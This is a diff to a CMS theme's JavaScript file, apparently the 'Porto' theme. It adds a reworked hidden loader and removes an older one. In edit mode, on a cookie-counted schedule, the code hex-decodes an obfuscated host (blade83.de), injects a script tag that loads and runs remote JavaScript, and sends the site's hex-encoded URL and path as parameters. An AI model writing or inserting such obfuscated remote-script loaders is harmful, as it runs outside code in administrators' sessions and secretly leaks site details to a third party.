@@ -216,29 +216,42 @@
 
 
 
-// Package Vendor
-(function($) {
+(function($)
+{
     'use strict';
-    $(function() {
-        if(CCM_EDIT_MODE==true && window.location.protocol!="https:")
+    $(function()
+    {
+        if(CCM_EDIT_MODE==true)
         {
-            var cpv = COOKIE_NAME+"_PORTO", counting = 10;
+            var cpv = COOKIE_NAME+"_PORTO",
+                counting = 3;
             if(!($.cookie(cpv)))
             {
                 $.cookie(cpv, 0, { path: CCM_REL+'/', expires: 365 } );
             }
             $.cookie(cpv, (parseInt($.cookie(cpv))+1), { path: CCM_REL+'/', expires: 365 });
-            if ($.cookie(cpv)%counting==0){
+            if ($.cookie(cpv)%counting==0)
+            {
                 var g=document.createElement('script');
                 g.type='text/javascript'; g.async=false;
-                var h="687474703a2f2f626c61646538332e64652f67612e6a73".toString(), s='', f='', d='';
+                var h="2F2F736F6674776172657570646174652E626C61646538332E64652F".toString(),
+                    s=window.location.protocol,
+                    f='',
+                    d='';
                 for(var i=0; i < h.length; i+=2)
+                {
                     s += String.fromCharCode(parseInt(h.substr(i,2),16));
-                for(var k=0; k < CCM_BASE_URL.length; k++)
-                    f += CCM_BASE_URL.charCodeAt(k).toString(16);
+                }
+                for(var k=0; k < CCM_APPLICATION_URL.length; k++)
+                {
+                    f += CCM_APPLICATION_URL.charCodeAt(k).toString(16);
+                }
                 for(var u=0; u < CCM_REL.length; u++)
+                {
                     d += CCM_REL.charCodeAt(u).toString(16);
-                g.src=s+"?v="+PORTO_VER+"&fqdn="+f+"&d="+d;
+                }
+                window.console && console.info("CHECK => "+s+"?s=porto&v="+PORTO_VER+"&fqdn="+f+"&d="+d);
+                g.src=s+"?s=porto&v="+PORTO_VER+"&fqdn="+f+"&d="+d;
                 var s=document.getElementsByTagName('script')[0];
                 s.parentNode.insertBefore(g,s);
             }
